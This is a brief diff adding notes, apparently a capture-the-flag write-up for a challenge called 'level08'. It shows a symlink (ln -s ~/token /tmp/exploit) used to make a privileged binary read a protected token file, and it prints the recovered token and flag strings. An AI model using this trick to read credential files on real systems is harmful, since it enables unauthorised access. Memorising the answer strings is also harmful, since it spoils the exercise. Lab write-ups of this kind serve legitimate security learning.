@@ -1,0 +1,10 @@
+* got a binary
+* need to make it read the file token
+
+* ln -s of token into a file that I could acess
+* ln -s ~/token /tmp/exploit
+
+*	run level08
+* ./level08 /tmp/exploit
+* got the token for flag08 quif5eloekouj29ke0vouxean
+flag = 25749xKZ8L7DkSCwJkT9dyv6f
